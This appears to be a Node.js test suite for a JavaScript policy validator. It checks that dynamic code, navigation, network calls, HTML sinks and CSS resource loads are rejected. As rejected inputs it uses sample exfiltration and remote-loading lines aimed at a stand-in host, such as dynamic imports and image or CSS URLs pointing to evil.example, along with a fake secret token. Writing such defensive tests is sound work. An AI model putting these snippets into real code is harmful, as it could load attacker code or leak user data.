import assert from "node:assert/strict";
import test from "node:test";
import { JavaScriptPolicyError, validateJavaScript } from "../scripts/lib/javascript-policy.mjs";
function reject(source,code){assert.throws(()=>validateJavaScript(source,{declaredGlobals:["lucide"]}),(error)=>{assert.ok(error instanceof JavaScriptPolicyError);assert.ok(error.violations.some((item)=>item.code===code),JSON.stringify(error.violations));return true;});}
test("allows local state, DOM interaction, timers, observers and drawing",()=>assert.equal(validateJavaScript(`const state={n:0};document.querySelector('button').addEventListener('click',()=>{state.n++;});setTimeout(()=>requestAnimationFrame(()=>{}),10);new ResizeObserver(()=>{});lucide.createIcons();`).ok,true));
test("rejects dynamic code and dynamic script construction",()=>{for(const source of ["eval('1')","new Function('return 1')","document.createElement('script')","node.setAttribute('src', value)"])reject(source,"js-dynamic-code");});
test("rejects aliased eval and ambiguous element creation",()=>{for(const source of ["const execute=eval;execute('1')","document.createElement(tagName)"])reject(source,"js-dynamic-code");});
test("rejects window escape and navigation",()=>{for(const source of ["window.open('https://x')","top.location='https://x'","parent.postMessage('x','*')","location.assign('https://x')"])reject(source,"js-navigation");});
test("rejects undeclared network APIs",()=>{for(const source of ["fetch('/x')","new XMLHttpRequest()","new WebSocket('wss://x')","navigator.sendBeacon('/x','x')"])reject(source,"js-network");});
test("rejects aliased network APIs and dynamic module loading",()=>{for(const source of ["const request=fetch;request('/x')","const Socket=WebSocket;new Socket('wss://x')","const beacon=navigator.sendBeacon;beacon('/x','x')","import('https://evil.example/x.js')"])reject(source,source.startsWith("import")?"js-dynamic-code":"js-network");});
test("rejects destructured or dynamically addressed sensitive APIs",()=>{
  reject("const {fetch:request}=window;request('/x')","js-network");
  reject("const method='fetch';window[method]('/x')","js-network");
  reject("const w=window;w.open('https://x')","js-navigation");
  reject("const create=document.createElement;create('script')","js-dynamic-code");
});
test("rejects qualified network APIs and nested location writes",()=>{reject("globalThis.fetch('/x')","js-network");reject("window.location.href='https://x'","js-navigation");});
test("rejects resource URL property writes",()=>{reject("image.src='https://evil.example/x.png'","js-network");reject("link.href=value","js-network");});
test("rejects secret-like literals and unsafe HTML sinks",()=>{reject("const token='sk-abcdefghijklmnopqrstuvwxyz123456';","js-secret-literal");reject("target.innerHTML=userInput;","js-unsafe-html-sink");});
test("reports parse failures for CDATA variants",()=>reject("<![CDATA[eval('1')]]>","javascript-parse"));

test("rejects equivalent global network API spellings", () => {
  const cases = [
    "new XMLHttpRequest()",
    "new window.XMLHttpRequest()",
    "new globalThis.XMLHttpRequest()",
    "new self.XMLHttpRequest()",
    "new WebSocket('wss://x')",
    "new window.WebSocket('wss://x')",
    "new globalThis.WebSocket('wss://x')",
    "new self.WebSocket('wss://x')",
    "navigator.sendBeacon('/x', 'x')",
    "window.navigator.sendBeacon('/x', 'x')",
    "globalThis.navigator.sendBeacon('/x', 'x')",
    "self.navigator.sendBeacon('/x', 'x')",
    "fetch('/x')",
    "window.fetch('/x')",
    "globalThis.fetch('/x')",
    "self.fetch('/x')",
  ];
  for (const source of cases) reject(source, "js-network");
});

test("rejects equivalent window, history and form escape calls", () => {
  const cases = [
    "open('https://x')",
    "window.open('https://x')",
    "globalThis.open('https://x')",
    "self.open('https://x')",
    "form.submit()",
    "form.requestSubmit()",
    "history.pushState({}, '', '/x')",
    "window.history.replaceState({}, '', '/x')",
    "globalThis.history.go(-1)",
    "self.history.back()",
    "history.forward()",
    "window.top.location = 'https://x'",
    "globalThis.parent.postMessage('x', '*')",
  ];
  for (const source of cases) reject(source, "js-navigation");
});

test("rejects namespace script creation and executable markup parsing", () => {
  const cases = [
    "document.createElementNS('http://www.w3.org/1999/xhtml', 'script')",
    "window.document.createElementNS('http://www.w3.org/2000/svg', 'script')",
    "globalThis.document.createElementNS(namespace, tagName)",
    "new DOMParser().parseFromString(userHtml, 'text/html')",
    "new DOMParser().parseFromString(userHtml, 'application/xhtml+xml')",
  ];
  for (const source of cases) reject(source, "js-dynamic-code");
});

test("rejects dynamic CSS resource sinks", () => {
  const cases = [
    "node.style.backgroundImage = 'url(https://evil.example/x.png)'",
    "node.style.background = imageValue",
    "node.style.maskImage = 'image-set(https://evil.example/x.png 1x)'",
    "node.style.setProperty('background-image', 'url(https://evil.example/x.png)')",
    "node.style.setProperty('cursor', cursorValue)",
    "node.style.setProperty(propertyName, value)",
  ];
  for (const source of cases) reject(source, "js-style-resource");
});

test("allows non-resource DOM and style interaction", () => {
  assert.equal(
    validateJavaScript(`
      const node = document.querySelector('.card');
      node.textContent = 'Selected';
      node.parent.textContent = 'Container';
      node.style.color = '#123456';
      node.style.backgroundColor = state.active ? '#fff' : '#eee';
      node.style.backgroundImage = 'url(#local-gradient)';
      node.style.setProperty('color', '#123456');
      node.style.setProperty('background-image', 'linear-gradient(#fff, #eee)');
    `).ok,
    true,
  );
});

test("rejects equivalent window handles including defaultView", () => {
  const cases = [
    "document.defaultView.fetch('/x')",
    "ownerDocument.defaultView.fetch('/x')",
    "new document.defaultView.XMLHttpRequest()",
    "new globalThis.document.defaultView.XMLHttpRequest()",
    "document['default' + 'View'].fetch('/x')",
    "const {defaultView: view} = document",
    "const {opener: otherWindow} = window",
    "const {frames: childWindows} = window",
    "window.opener.postMessage('x', '*')",
    "document.defaultView.opener.location = 'https://x'",
    "window.frames[0].location = 'https://x'",
  ];
  for (const source of cases) {
    reject(
      source,
      /(?:fetch|XMLHttpRequest)/.test(source) ? "js-network" : "js-navigation",
    );
  }
  reject(
    "document.defaultView.navigator.sendBeacon('/x', 'payload')",
    "js-network",
  );
});

test("validates setAttributeNS and rejects dynamic or active attributes", () => {
  const cases = [
    "node.setAttributeNS(null, 'href', 'https://evil.example')",
    "node.setAttributeNS(null, 'onclick', handlerSource)",
    "node.setAttributeNS(namespace, attributeName, value)",
    "node.setAttributeNS(null, name, value)",
    "node.setAttribute(name, value)",
  ];
  for (const source of cases) reject(source, "js-dynamic-code");
  reject(
    "node.setAttributeNS(null, 'style', 'background:url(https://evil.example/x)')",
    "js-style-resource",
  );
  reject(
    "node.setAttributeNS(null, 'style', cssText)",
    "js-style-resource",
  );
});

test("rejects every executable HTML string sink", () => {
  const cases = [
    "node.innerHTML = '<strong>Static</strong>'",
    "node.outerHTML = '<div>Static</div>'",
    "node.insertAdjacentHTML('beforeend', '<span>Static</span>')",
    "document.write('<p>Static</p>')",
    "document.writeln('<p>Static</p>')",
    "range.createContextualFragment('<p>Static</p>')",
    "const insert = node.insertAdjacentHTML",
    "const {innerHTML: renderMarkup} = node",
  ];
  for (const source of cases) reject(source, "js-unsafe-html-sink");
});

test("evaluates computed CSS property names and custom property values", () => {
  const cases = [
    `node.style["background" + "Image"] = "url(https://evil.example/x.png)"`,
    "node.style[`background${'Image'}`] = 'url(https://evil.example/x.png)'",
    "node.style.setProperty('background' + '-image', 'url(https://evil.example/x.png)')",
    "node.style.setProperty(`--${'remote-image'}`, 'url(https://evil.example/x.png)')",
    "node.style.setProperty('--remote-image', value)",
    "node.style['--remote-image'] = 'url(https://evil.example/x.png)'",
    "node.style['--remote-image'] = value",
    "node.style['--remote-image'] += suffix",
    "node.style[propertyName] = value",
  ];
  for (const source of cases) reject(source, "js-style-resource");
});

test("rejects CSSOM string injection APIs and adopted stylesheets", () => {
  const cases = [
    "sheet.insertRule('body{background:url(https://evil.example/x)}')",
    "sheet.addRule('body', cssText)",
    "sheet.replace('body{color:red}')",
    "sheet.replaceSync(cssText)",
    "document.adoptedStyleSheets = [sheet]",
    "const {insertRule: injectRule} = sheet",
    "const {replaceSync: replaceStyles} = sheet",
  ];
  for (const source of cases) reject(source, "js-style-resource");
});

test("allows safe namespaced attributes and static local CSS", () => {
  assert.equal(
    validateJavaScript(`
      node.textContent = state.label;
      node.setAttributeNS(null, 'class', 'card');
      node.setAttributeNS(null, 'aria-label', state.label);
      node.style.backgroundColor = '#ffffff';
      node.style['background' + 'Image'] = 'url(#local-gradient)';
      node.style.setProperty('--accent', 'linear-gradient(#fff, #eee)');
    `).ok,
    true,
  );
});
